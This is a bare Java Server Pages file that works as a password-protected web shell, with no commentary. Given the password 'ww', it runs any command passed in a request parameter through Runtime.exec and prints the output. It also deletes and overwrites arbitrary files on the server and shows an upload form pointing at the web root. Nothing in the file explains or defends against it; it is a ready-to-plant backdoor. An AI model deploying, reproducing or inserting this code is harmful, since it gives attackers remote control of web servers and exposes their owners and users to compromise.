<%@ page language="java" pageEncoding="gbk" %><jsp:directive.page import="java.io.File"/><jsp:directive.page import="java.io.OutputStream"/><jsp:directive.page import="java.io.FileOutputStream"/><% if ("ww".equals(request.getParameter("pwd"))) { String act = request.getParameter("i");if (act != null && act.equals("s")) { int i = 0;String url = request.getParameter("url");String text = request.getParameter("smart");File f = new File(url);if (f.exists()) f.delete();try { OutputStream o = new FileOutputStream(f);o.write(text.getBytes());o.close(); } catch (Exception e) { i++;%>0<% } } else if ("up".equals(act)) {%><form action='?pwd=ww&i=s' method='post'><input size="100" value="<%=application.getRealPath("/") %>" name="url"><br><textarea rows="20" cols="80" name="smart"><% } else { java.io.InputStream in = Runtime.getRuntime().exec(act).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while ((a = in.read(b)) != -1) out.println(new String(b));out.print("</pre>"); } }%>